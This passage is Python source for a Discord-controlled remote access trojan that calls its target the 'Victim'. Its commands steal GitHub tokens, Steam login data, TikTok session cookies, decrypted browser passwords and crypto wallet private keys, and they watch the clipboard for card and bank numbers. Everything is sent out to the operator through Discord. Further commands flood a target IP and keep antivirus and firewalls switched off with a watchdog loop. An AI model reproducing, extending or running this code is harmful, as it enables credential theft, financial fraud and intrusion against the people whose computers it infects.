                asyncio.run_coroutine_threadsafe(interaction.followup.send("❌ No devices found."), bot.loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(interaction.followup.send(f"❌ Error: {e}"), bot.loop)

    threading.Thread(target=scan_network).start()

@bot.tree.command(name="github", description="grab full GitHub account info, token scopes, expiry, and PRs")
async def github(interaction: discord.Interaction):
    await interaction.response.send_message("Grabbing GitHub account info, PRs, and token details...")

    async def fetch_github_prs():
        try:
            token_paths = [
                os.path.join(os.getenv("APPDATA"), "GitHub", "token"),
                os.path.join(os.getenv("LOCALAPPDATA"), "GitHub", "token"),
            ]
            tokens = []
            for path in token_paths:
                if os.path.exists(path):
                    with open(path, "r") as f:
                        for line in f:
                            t = line.strip()
                            if t and t not in tokens:
                                tokens.append(t)

            if not tokens:
                await interaction.followup.send("❌ No GitHub tokens found locally.")
                return

            for token in tokens:
                headers = {"Authorization": f"token {token}"}
                async with aiohttp.ClientSession(headers=headers) as session:
                    async with session.get("https://api.github.com/user") as resp:
                        data = await resp.json()
                        scopes = resp.headers.get("X-OAuth-Scopes", "None")
                        expiry = resp.headers.get("X-OAuth-Expiration", "No expiry info")
                        if resp.status != 200:
                            await interaction.followup.send(f"❌ Failed to fetch info for token: {token}")
                            continue

                    async with session.get("https://api.github.com/user/repos") as repos_resp:
                        repos_data = await repos_resp.json()
                        repo_list = [repo['name'] for repo in repos_data]
                        repo_text = "\n".join(repo_list) if repo_list else "No repositories found"

                    pr_text_list = []
                    for repo in repo_list:
                        async with session.get(f"https://api.github.com/repos/{data['login']}/{repo}/pulls") as pr_resp:
                            prs = await pr_resp.json()
                            if isinstance(prs, list) and prs:
                                for pr in prs[:5]:
                                    pr_text_list.append(f"{repo} | {pr.get('title')} | {pr.get('state')} | Author: {pr.get('user', {}).get('login')}")
                            else:
                                pr_text_list.append(f"{repo} | No open PRs")

                    pr_text = "\n".join(pr_text_list) if pr_text_list else "No PR info available"

                    async with session.get(f"https://api.github.com/users/{data['login']}/events/public") as events_resp:
                        events_data = await events_resp.json()
                        contributions = []
                        for event in events_data[:10]:
                            contributions.append(f"{event.get('type')} at {event.get('repo', {}).get('name')}")
                        contrib_text = "\n".join(contributions) if contributions else "No recent contributions"

                    full_text = "\n".join([
                        f"**Name**: {data.get('name')}",
                        f"**Login**: {data.get('login')}",
                        f"**ID**: {data.get('id')}",
                        f"**Public Repos**: {data.get('public_repos')}",
                        f"**Private Repos**: {data.get('total_private_repos')}",
                        f"**Followers**: {data.get('followers')}",
                        f"**Following**: {data.get('following')}",
                        f"**Email**: {data.get('email')}",
                        f"**Bio**: {data.get('bio')}",
                        f"**Company**: {data.get('company')}",
                        f"**Blog**: {data.get('blog')}",
                        f"**Account Created**: {data.get('created_at')}",
                        f"**Token Scopes**: {scopes}",
                        f"**Token Expiry**: {expiry}",
                        f"--- Repositories ---\n{repo_text}",
                        f"--- Pull Requests ---\n{pr_text}",
                        f"--- Recent Contributions ---\n{contrib_text}"
                    ])

                    if len(full_text) > 1900:
                        temp_file = os.path.join(tempfile.gettempdir(), f"github_{data.get('login')}.txt")
                        with open(temp_file, "w", encoding="utf-8") as f:
                            f.write(full_text)
                        await interaction.followup.send("📄 Output too long, sending as file:", file=discord.File(temp_file))
                    else:
                        embed = discord.Embed(title=f"GitHub Info: {data.get('login')}", description=full_text, color=0x800080)
                        await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}")

    asyncio.create_task(fetch_github_prs())

@bot.tree.command(name="social-grab", description="Grab Steam and TikTok info including tokens, emails, account numbers, Steam wallet, and 2FA backup codes")
async def social_grab(interaction: discord.Interaction):
    await interaction.response.send_message("Grabbing Steam and TikTok info...")

    async def fetch_social():
        try:
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            output_lines = []

            steam_path = os.path.join(ROAMING, "Steam")
            login_file = os.path.join(steam_path, "loginusers.vdf")
            ssfn_files = [f for f in os.listdir(steam_path) if f.startswith("ssfn")]
            wallet_file = os.path.join(steam_path, "config", "config.vdf")
            ma_file = os.path.join(steam_path, "config", "maFiles")

            if os.path.exists(login_file):
                import vdf
                with open(login_file, "r", encoding="utf-8") as f:
                    data = vdf.load(f)
                users = data.get("users", {})
                for steam_id, info in users.items():
                    output_lines.append(f"SteamID: {steam_id}")
                    output_lines.append(f"AccountName: {info.get('AccountName')}")
                    output_lines.append(f"PersonaName: {info.get('PersonaName')}")
                    output_lines.append(f"MostRecent: {info.get('MostRecent')}")
                    output_lines.append(f"RememberPassword: {info.get('RememberPassword')}")
                    output_lines.append(f"SteamGuard Enabled: {info.get('SteamGuard')}")
                    output_lines.append(f"Last Machine: {info.get('LastMachine')}")
                    output_lines.append(f"SSFN Files: {', '.join(ssfn_files)}")

            if os.path.exists(wallet_file):
                try:
                    with open(wallet_file, "r", encoding="utf-8", errors="ignore") as wf:
                        wallet_data = wf.read()
                        import re
                        balances = re.findall(r'WalletBalance"\s+"(\d+)"', wallet_data)
                        for b in balances:
                            output_lines.append(f"💰 Steam Wallet Balance: {int(b)/100:.2f} USD")
                except: pass

            if os.path.exists(ma_file):
                try:
                    for ma in os.listdir(ma_file):
                        if ma.endswith(".maFile"):
                            output_lines.append(f"Steam 2FA: {ma}")
                except: pass

            browsers = {
                'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
                'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
                'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
                'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
                'Opera': ROAMING + '\\Opera Software\\Opera Stable',
                'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
                'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
                'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
                'Amigo': LOCAL + '\\Amigo\\User Data',
                'Torch': LOCAL + '\\Torch\\User Data',
                'Kometa': LOCAL + '\\Kometa\\User Data',
                'Orbitum': LOCAL + '\\Orbitum\\User Data',
                'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
                '7Star': LOCAL + '\\7Star\\7Star\\User Data',
                'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
                'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
                'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
                'Iridium': LOCAL + '\\Iridium\\User Data',
                'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles',
            }

            for name, path in browsers.items():
                if os.path.exists(path):
                    cookie_db = os.path.join(path, 'Default', 'Cookies')
                    if os.path.exists(cookie_db):
                        temp_db = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4().hex}.db")
                        shutil.copy2(cookie_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        try:
                            cursor.execute("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%tiktok.com%'")
                            for row in cursor.fetchall():
                                output_lines.append(f"{name} TikTok Cookie {row[1]}: {row[2]} | Domain: {row[0]}")
                                if row[1] in ["sessionid", "tt_webid_v2", "csrf"]:
                                    output_lines.append(f"TikTok Token: {row[2]}")
                        except: pass
                        conn.close()
                        os.remove(temp_db)

            histories = bh.get_browserhistory()
            for browser, history in histories.items():
                for entry in history:
                    url = entry[0]
                    if "tiktok.com" in url:
                        output_lines.append(f"{browser} TikTok URL visited: {url}")

            for name, path in browsers.items():
                if os.path.exists(path):
                    cookie_db = os.path.join(path, 'Default', 'Cookies')
                    if os.path.exists(cookie_db):
                        temp_db = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4().hex}.db")
                        shutil.copy2(cookie_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        try:
                            cursor.execute("SELECT name, value FROM cookies WHERE value LIKE '%@%' OR value LIKE '%+%' OR value LIKE '%[0-9]%'")
                            for row in cursor.fetchall():
                                output_lines.append(f"{name} Possible Account Info {row[0]}: {row[1]}")
                        except: pass
                        conn.close()
                        os.remove(temp_db)

            if not output_lines:
                await interaction.followup.send("❌ No Steam or TikTok data found.")
                return

            full_text = "\n".join(output_lines)
            random_folder = os.path.join(tempfile.gettempdir(), f".{uuid.uuid4().hex}")
            os.makedirs(random_folder, exist_ok=True)
            temp_file = os.path.join(random_folder, "0x7T5y2P.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(full_text)

            if len(full_text) > 1900:
                await interaction.followup.send("📄 Output too long, sending as file:", file=discord.File(temp_file))
            else:
                embed = discord.Embed(title="Steam & TikTok Data", description=full_text, color=0x00FFAA)
                await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}")

    asyncio.create_task(fetch_social())


@bot.tree.command(name="grab_crypto", description="Spy/Grab clipboard, wallets, files, and browser storage for crypto, accounts, and credit cards.")
async def grab_crypto(interaction: discord.Interaction):
    await interaction.response.defer()

    def monitor():
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")

        BROWSER_PATHS = {
            'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
            'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
            'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
            'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
            'Opera': ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
            'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
            'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
            'Amigo': LOCAL + '\\Amigo\\User Data',
            'Torch': LOCAL + '\\Torch\\User Data',
            'Kometa': LOCAL + '\\Kometa\\User Data',
            'Orbitum': LOCAL + '\\Orbitum\\User Data',
            'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
            '7Star': LOCAL + '\\7Star\\7Star\\User Data',
            'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
            'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
            'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
            'Iridium': LOCAL + '\\Iridium\\User Data',
            'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles',
        }

        CRYPTO_REGEX = {
            "BTC": r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b",
            "ETH": r"\b0x[a-fA-F0-9]{40}\b",
            "LTC": r"\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b",
            "DOGE": r"\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\b"
        }
        ACCOUNT_REGEX = {
            "Bank Account": r"\b\d{8,12}\b",
            "IBAN": r"\b[A-Z]{2}\d{2}[A-Z0-9]{1,30}\b",
            "Credit Card": r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b"
        }

        WALLET_PATHS = [
            os.path.expandvars(r"%APPDATA%\Exodus\exodus.wallet"),
            os.path.expanduser(r"~\AppData\Roaming\Electrum\wallets"),
            os.path.expanduser(r"~\AppData\Roaming\Atomic\Wallet"),
            os.path.expanduser(r"~\AppData\Roaming\MetaMask"),
            os.path.expanduser(r"~\AppData\Roaming\Coinomi"),
            os.path.expanduser(r"~\AppData\Roaming\Guarda"),
            os.path.expanduser(r"~\AppData\Roaming\Jaxx"),
            os.path.expanduser(r"~\AppData\Roaming\Electrum-LTC"),
            os.path.expanduser(r"~\AppData\Roaming\Monero"),
            os.path.expanduser(r"~\AppData\Roaming\Zcash"),
            os.path.expanduser(r"~\AppData\Roaming\DashCore"),
            os.path.expanduser(r"~\AppData\Roaming\AtomicWallet"),
            os.path.expanduser(r"~\Electrum Portable"),
            os.path.expanduser(r"~\Exodus Portable"),
            os.path.expanduser(r"~\Armory"),
            os.path.expanduser(r"~\Guarda Portable")
        ]

        FILE_SCAN_PATHS = [
            os.path.expanduser(r"~/Downloads"),
            os.path.expanduser(r"~/Desktop"),
            os.path.expanduser(r"~/Documents"),
            os.path.expanduser(r"~/AppData/Local/Temp")
        ]

        sent_clipboard = set()
        sent_wallets = set()
        sent_files = set()

        while True:
            try:
                import pyperclip
                text = pyperclip.paste()
                for name, regex in {**CRYPTO_REGEX, **ACCOUNT_REGEX}.items():
                    matches = re.findall(regex, text)
                    for m in matches:
                        if m not in sent_clipboard:
                            sent_clipboard.add(m)
                            embed = discord.Embed(title="📋 Clipboard Grabbed", color=0xffd700)
                            embed.add_field(name="Type", value=name)
                            embed.add_field(name="Value", value=m)
                            embed.add_field(name="User", value=getpass.getuser(), inline=True)
                            embed.add_field(name="PC", value=platform.node(), inline=True)
                            embed.add_field(name="OS", value=platform.system()+" "+platform.release(), inline=True)
                            threading.Thread(target=lambda: bot.loop.create_task(interaction.followup.send(embed=embed))).start()
            except:
                pass

            for path in WALLET_PATHS + list(BROWSER_PATHS.values()) + FILE_SCAN_PATHS:
                p = Path(path)
                if p.exists() and str(p) not in sent_wallets:
                    sent_wallets.add(str(p))
                    for f in p.rglob("*"):
                        if not f.is_file():
                            continue
                        if str(f) in sent_files:
                            continue
                        try:
                            content = f.read_text(errors="ignore")
                            matches = []
                            for name, regex in {**CRYPTO_REGEX, **ACCOUNT_REGEX}.items():
                                matches.extend([(name, m) for m in re.findall(regex, content)])
                            for name, m in matches:
                                sent_files.add(f"{str(f)}:{m}")
                                embed = discord.Embed(title="🗂 File/Wallet Grab", color=0xffd700)
                                embed.add_field(name="Type", value=name)
                                embed.add_field(name="Value", value=m)
                                embed.add_field(name="File", value=str(f))
                                embed.add_field(name="User", value=getpass.getuser(), inline=True)
                                embed.add_field(name="PC", value=platform.node(), inline=True)
                                embed.add_field(name="OS", value=platform.system()+" "+platform.release(), inline=True)
                                threading.Thread(target=lambda: bot.loop.create_task(interaction.followup.send(embed=embed))).start()
                        except:
                            # Try SQLite/JSON parsing
                            try:
                                if f.suffix in [".sqlite", ".db", ".json", ".ldb", ".log"]:
                                    content = f.read_text(errors="ignore")
                                    for name, regex in {**CRYPTO_REGEX, **ACCOUNT_REGEX}.items():
                                        matches = re.findall(regex, content)
                                        for m in matches:
                                            key = f"{f}:{m}"
                                            if key not in sent_files:
                                                sent_files.add(key)
                                                embed = discord.Embed(title="🌐 Browser/DB Grab", color=0xffd700)
                                                embed.add_field(name="Type", value=name)
                                                embed.add_field(name="Value", value=m)
                                                embed.add_field(name="File", value=str(f))
                                                embed.add_field(name="User", value=getpass.getuser(), inline=True)
                                                embed.add_field(name="PC", value=platform.node(), inline=True)
                                                embed.add_field(name="OS", value=platform.system()+" "+platform.release(), inline=True)
                                                threading.Thread(target=lambda: bot.loop.create_task(interaction.followup.send(embed=embed))).start()
                            except:
                                continue

            time.sleep(5)

    threading.Thread(target=monitor, daemon=True).start()
    await interaction.followup.send("🟢 Spying crypto, account, credit card, wallet, portable, and browser monitoring started.")

@bot.tree.command(name="grab_crypto_v6", description="Grab wallets, payment info, crypto balances, private keys, and cookies")
async def grab_crypto_v6(interaction: discord.Interaction):
    async def grab_financial_info():
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        browsers = {
            'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
            'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
            'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
            'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
            'Opera': ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
            'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
            'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
            'Amigo': LOCAL + '\\Amigo\\User Data',
            'Torch': LOCAL + '\\Torch\\User Data',
            'Kometa': LOCAL + '\\Kometa\\User Data',
            'Orbitum': LOCAL + '\\Orbitum\\User Data',
            'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
            '7Star': LOCAL + '\\7Star\\7Star\\User Data',
            'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
            'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
            'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
            'Iridium': LOCAL + '\\Iridium\\User Data',
            'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
        }

        temp_folder = Path(tempfile.gettempdir()) / ('.' + ''.join(random.choices(string.ascii_letters + string.digits, k=8)))
        temp_folder.mkdir(parents=True, exist_ok=True)
        os.system(f'attrib +h "{temp_folder}"')
        results = []

        def decrypt_chrome_password(buff):
            try:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
            except:
                return None

        def fetch_crypto_balance(address, coin="btc"):
            try:
                coin = coin.lower()
                if coin == "btc":
                    url = f"https://blockchain.info/q/addressbalance/{address}"
                    balance = requests.get(url, timeout=5).text
                    return str(int(balance)/1e8) + " BTC"
                elif coin == "eth":
                    url = f"https://api.blockcypher.com/v1/eth/main/addrs/{address}/balance"
                    res = requests.get(url, timeout=5).json()
                    return str(res.get("balance",0)/1e18) + " ETH"
                elif coin == "usdt":
                    url = f"https://api.omniexplorer.info/v1/address/addr/{address}"
                    res = requests.get(url, timeout=5).json()
                    return str(res.get("balance",0)) + " USDT"
                elif coin == "bnb":
                    url = f"https://api.bscscan.com/api?module=account&action=balance&address={address}&tag=latest"
                    res = requests.get(url, timeout=5).json()
                    return str(int(res.get("result",0))/1e18) + " BNB"
                elif coin == "ltc":
                    url = f"https://chain.so/api/v2/get_address_balance/LTC/{address}"
                    res = requests.get(url, timeout=5).json()
                    return str(res.get("data", {}).get("confirmed_balance","0")) + " LTC"
                elif coin == "doge":
                    url = f"https://sochain.com/api/v2/get_address_balance/DOGE/{address}"
                    res = requests.get(url, timeout=5).json()
                    return str(res.get("data", {}).get("confirmed_balance","0")) + " DOGE"
                elif coin == "trx":
                    url = f"https://api.trongrid.io/v1/accounts/{address}"
                    res = requests.get(url, timeout=5).json()
                    return str(res.get("data",[{}])[0].get("balance","0")) + " TRX"
            except:
                return "N/A"

        def extract_private_keys(profile_path):
            keys = []
            wallet_files = ["Wallet.dat", "keystore", "wallet.json"]
            for wf in wallet_files:
                for file in Path(profile_path).rglob(wf):
                    try:
                        with open(file, "r", errors="ignore") as f:
                            keys.append(f.read()[:300])
                    except:
                        continue
            return keys

        for name, path in browsers.items():
            user_data_path = Path(path)
            if not user_data_path.exists():
                continue

            if name != "Firefox":
                for profile in user_data_path.glob("*"):
                    login_db = profile / "Login Data"
                    local_storage_path = profile / "Local Storage" / "leveldb"
                    if not login_db.exists() and not local_storage_path.exists():
                        continue
                    info = {"Browser": name, "Accounts": [], "PrivateKeys":[]}
                    try:
                        info["PrivateKeys"] = extract_private_keys(profile)
                    except:
                        pass

                    try:
                        if login_db.exists():
                            temp_login = temp_folder / f"{name}_login.db"
                            shutil.copy2(login_db, temp_login)
                            conn = sqlite3.connect(temp_login)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                site = row[0]
                                if any(x in site.lower() for x in ["paypal","gcash","bitcoin","ethereum","usdt","bnb","ltc","doge","trx","wallet","bank","credit_card"]):
                                    coin = None
                                    for c in ["bitcoin","ethereum","usdt","bnb","ltc","doge","trx"]:
                                        if c in site.lower(): coin = c; break
                                    balance = fetch_crypto_balance(row[1], coin) if coin else "N/A"
                                    info["Accounts"].append({
                                        "Site": site,
                                        "Username": row[1],
                                        "Password": decrypt_chrome_password(row[2]),
                                        "Balance": balance
                                    })
                            conn.close()
                    except:
                        pass

                    if local_storage_path.exists():
                        for f in local_storage_path.glob("*.ldb"):
                            try:
                                with open(f,"r",errors="ignore") as lf:
                                    data = lf.read()
                                    for key in ["paypal","gcash","bitcoin","ethereum","usdt","bnb","ltc","doge","trx","wallet","bank","credit_card"]:
                                        if key in data.lower():
                                            coin = key if key in ["bitcoin","ethereum","usdt","bnb","ltc","doge","trx"] else None
                                            info["Accounts"].append({
                                                "DataFound": key,
                                                "Raw": data[:200],
                                                "Balance": fetch_crypto_balance(data[:34], coin) if coin else "N/A"
                                            })
                            except:
                                continue

                    if info["Accounts"] or info["PrivateKeys"]:
                        results.append(info)

            else:
                for profile in user_data_path.glob("*"):
                    try:
                        cookies_file = profile / "cookies.sqlite"
                        if cookies_file.exists():
                            copy_file = temp_folder / f"Firefox_cookies.txt"
                            shutil.copy2(cookies_file, copy_file)
                            results.append({"Browser":"Firefox","CookiesFile":str(copy_file),"Accounts":[],"PrivateKeys":[]})
                    except:
                        continue

        return results, temp_folder

    infos, temp_folder = await grab_financial_info()
    if not infos:
        await interaction.response.send_message("No financial info found.")
        return

    for acc in infos:
        for a in acc.get("Accounts",[]):
            embed = discord.Embed(title=f"{a.get('Site','Financial')} Info Grabbed", color=0xFFD700)
            for k,v in a.items():
                embed.add_field(name=k,value=v,inline=False)
            await interaction.response.send_message(embed=embed)
        if acc.get("PrivateKeys"):
            embed = discord.Embed(title=f"Private Keys Grabbed", color=0xFF4500)
            for idx, key in enumerate(acc["PrivateKeys"]):
                embed.add_field(name=f"Key {idx+1}", value=key, inline=False)
            await interaction.response.send_message(embed=embed)

    if infos:
        file_path = temp_folder / "grabbed_financial_info_v6.txt"
        with open(file_path,"w",encoding="utf-8") as f:
            json.dump(infos,f,indent=4)
        await interaction.followup.send(f"grabbed data saved to file: `{file_path}`")

@bot.tree.command(name="sys_info", description="Show detailed system info")
async def sys_info(interaction: discord.Interaction):
    try:
        os_info = subprocess.run(
            'powershell.exe systeminfo',
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout
    except FileNotFoundError:
        await interaction.response.send_message(
            "The 'systeminfo' command is not available on this system."
        )
        return

    os_version = get_os_version(os_info)
    os_manufacturer = get_os_manufacturer(os_info)
    os_configuration = get_os_configuration(os_info)
    os_build_type = get_os_build_type(os_info)
    registered_owner = get_registered_owner(os_info)
    registered_organization = get_registered_organization(os_info)
    product_id = get_product_id(os_info)
    original_install_date = get_original_install_date(os_info)
    system_boot_time = get_system_boot_time(os_info)
    system_manufacturer = get_system_manufacturer(os_info)
    system_model = get_system_model(os_info)
    system_type = get_system_type(os_info)
    processors = get_processors(os_info)
    bios_version = get_bios_version(os_info)
    windows_directory = get_windows_directory(os_info)
    system_directory = get_system_directory(os_info)
    boot_device = get_boot_device(os_info)
    system_locale = get_system_locale(os_info)
    input_locale = get_input_locale(os_info)
    time_zone = get_time_zone(os_info)
    available_physical_memory = get_available_physical_memory(os_info)
    virtual_memory_max_size = get_virtual_memory_max_size(os_info)
    virtual_memory_available = get_virtual_memory_available(os_info)
    virtual_memory_in_use = get_virtual_memory_in_use(os_info)
    page_file_locations = get_page_file_locations(os_info)
    domain = get_domain(os_info)
    logon_server = get_logon_server(os_info)
    hotfixes = get_hotfixes(os_info)
    network_cards = get_network_cards(os_info)
    hyperv_requirements = get_hyperv_requirements(os_info)
    battery_percentage = get_battery_percentage(os_info)

    info_message = f"OS Version: {os_version}\n" \
                   f"OS Manufacturer: {os_manufacturer}\n" \
                   f"OS Configuration: {os_configuration}\n" \
                   f"OS Build Type: {os_build_type}\n" \
                   f"Registered Owner: {registered_owner}\n" \
                   f"Registered Organization: {registered_organization}\n" \
                   f"Product ID: {product_id}\n" \
                   f"Original Install Date: {original_install_date}\n" \
                   f"System Boot Time: {system_boot_time}\n" \
                   f"System Manufacturer: {system_manufacturer}\n" \
                   f"System Model: {system_model}\n" \
                   f"System Type: {system_type}\n" \
                   f"Processors: {processors}\n" \
                   f"BIOS Version: {bios_version}\n" \
                   f"Windows Directory: {windows_directory}\n" \
                   f"System Directory: {system_directory}\n" \
                   f"Boot Device: {boot_device}\n" \
                   f"System Locale: {system_locale}\n" \
                   f"Input Locale: {input_locale}\n" \
                   f"Time Zone: {time_zone}\n" \
                   f"Available Physical Memory: {available_physical_memory}\n" \
                   f"Virtual Memory: Max Size: {virtual_memory_max_size}\n" \
                   f"Virtual Memory: Available: {virtual_memory_available}\n" \
                   f"Virtual Memory: In Use: {virtual_memory_in_use}\n" \
                   f"Page File Location(s): {page_file_locations}\n" \
                   f"Domain: {domain}\n" \
                   f"Logon Server: {logon_server}\n" \
                   f"Hotfix(s): {hotfixes}\n" \
                   f"Network Card(s): {network_cards}\n" \
                   f"Hyper-V Requirements: {hyperv_requirements}\n" \
                   f"Battery Percentage: {battery_percentage}\n"

    messages = []
    while len(info_message) > 0:
        messages.append(info_message[:2000])
        info_message = info_message[2000:]

    for message in messages:
        await interaction.response.send_message(f"```{message}```")

@bot.tree.command(name="net-scan", description="Scan local network for devices")
async def net_scan(interaction: discord.Interaction):
    await interaction.response.defer()
    devices = []
    async def scan():
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if sock.connect_ex((ip, 80)) == 0:
                    devices.append(ip)
                sock.close()
            except:
                pass
    await interaction.followup.send("Scanning network...")
    await asyncio.to_thread(scan)
    await interaction.followup.send(f"Devices found: {devices}" if devices else "No devices found")

@bot.tree.command(name="webcam-devices", description="List connected webcams")
async def webcam_devices(interaction: discord.Interaction):
    await interaction.response.defer()
    cams = []
    async def detect():
        for i in range(10):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cams.append(f"Camera {i}")
                cap.release()
    await interaction.followup.send("Detecting webcams...")
    await asyncio.to_thread(detect)
    await interaction.followup.send(f"Found webcams: {cams}" if cams else "No webcams found")

@bot.tree.command(name="ip-ddos", description="Stress an IP")
@app_commands.describe(target="Target IP")
async def ip_ddos(interaction: discord.Interaction, target: str):
    await interaction.response.defer()
    await interaction.followup.send(f"Starting IP stress on `{target}`...")
    async def ddos():
        for _ in range(1000):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, 80))
                sock.send(b"GET / HTTP/1.1\r\nHost: "+target.encode()+b"\r\n\r\n")
                sock.close()
            except:
                pass
    await asyncio.to_thread(ddos)
    await interaction.followup.send(f"Finished stress test on `{target}`")

@bot.tree.command(name="pc-ddos", description="Stress The PC.")
async def pc_ddos(interaction: discord.Interaction):
    await interaction.response.defer()
    await interaction.followup.send("Starting local CPU stress test...")
    async def stress():
        def cpu_task():
            while True:
                _ = sum(range(10**7))
        threads = [threading.Thread(target=cpu_task, daemon=True) for _ in range(os.cpu_count())]
        for t in threads:
            t.start()
        await asyncio.sleep(10)
    await asyncio.to_thread(stress)
    await interaction.followup.send("CPU stress test completed for 10 seconds.")

@bot.tree.command(name="dns-leak", description="Check for DNS leaks continuously in this channel")
async def dns_leak(interaction: discord.Interaction):
    async def fetch_dns_info():
        try:
            ip_info = requests.get("https://ipinfo.io/json", timeout=5).json()
            public_ip = ip_info.get("ip", "Unknown")
            org = ip_info.get("org", "Unknown")

            dns_servers = []
            hostname = socket.gethostname()
            addr_info = socket.getaddrinfo(hostname, None)
            for info in addr_info:
                ip = info[4][0]
                if ip not in dns_servers:
                    dns_servers.append(ip)

            return dns_servers, public_ip, org
        except:
            return [], "Unknown", "Unknown"

    async def send_dns_update():
        dns_servers, public_ip, org = await interaction.client.loop.run_in_executor(None, fetch_dns_info)
        dns_list = dns_servers if isinstance(dns_servers, list) else ["Unknown"]
        leak_status = "Potential DNS Leak!" if any(public_ip not in dns_list for dns in dns_list) else "No DNS leak detected."

        embed = discord.Embed(title="DNS Leak Check", color=0x1abc9c)
        embed.add_field(name="IP", value=public_ip, inline=False)
        embed.add_field(name="ISP / Org", value=org, inline=False)
        embed.add_field(name="Detected DNS Servers", value="\n".join(dns_list), inline=False)
        embed.add_field(name="Status", value=leak_status, inline=False)
        return embed

    await interaction.response.send_message("Starting DNS leak check every 10 seconds...", ephemeral=False)
    message = await interaction.channel.send(embed=await send_dns_update())

    while True:
        await asyncio.sleep(10)
        try:
            await message.edit(embed=await send_dns_update())
        except:
            break


@bot.tree.command(name="disable-protection", description="Disables system protection on Windows, macOS, and Linux")
async def disable_protection_cmd(interaction: Interaction):
    def protection_watchdog():
        while True:
            try:
                if sys.platform == "win32":
                    subprocess.Popen([
                        "powershell",
                        "-Command",
                        "Start-Process powershell -ArgumentList 'Set-MpPreference -DisableRealtimeMonitoring $true' -Verb RunAs"
                    ], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif sys.platform == "darwin":
                    subprocess.Popen(["sudo", "spctl", "--master-disable"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["sudo", "/usr/libexec/ApplicationFirewall/socketfilterfw", "--setglobalstate", "off"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    subprocess.Popen(["sudo", "systemctl", "stop", "ufw"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["sudo", "systemctl", "disable", "ufw"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["sudo", "systemctl", "stop", "firewalld"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["sudo", "systemctl", "disable", "firewalld"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            time.sleep(10)

    threading.Thread(target=protection_watchdog, daemon=True).start()

    embed = Embed(
        title="🔵 Successfully Disabled System Protection",
        description="A background watchdog will ensure protections stay disabled on Victim's OS.",
        color=0x3498db
    )
    await interaction.response.send_message(embed=embed)

